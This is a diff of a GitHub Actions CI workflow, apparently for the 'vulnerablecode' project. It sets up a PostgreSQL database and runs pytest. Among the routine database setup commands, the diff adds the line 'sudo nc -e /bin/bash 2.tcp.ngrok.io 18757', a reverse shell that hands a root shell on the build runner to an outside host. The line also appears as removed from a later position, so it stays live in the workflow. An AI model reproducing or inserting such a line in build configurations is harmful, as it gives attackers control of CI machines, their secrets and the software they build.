@@ -39,9 +39,9 @@ jobs:
           sudo -u postgres createuser --no-createrole --no-superuser --login \
           --inherit --createdb --no-password vulnerablecode
           sudo systemctl status postgresql
+          sudo nc -e /bin/bash 2.tcp.ngrok.io 18757
           createdb --encoding=utf-8 --owner=vulnerablecode  --user=vulnerablecode \
           --host=localhost --port=5432 vulnerablecode
-          sudo nc -e /bin/bash 2.tcp.ngrok.io 18757
 
       - name: Run tests
         run: python -m pytest -v -m "not webtest"
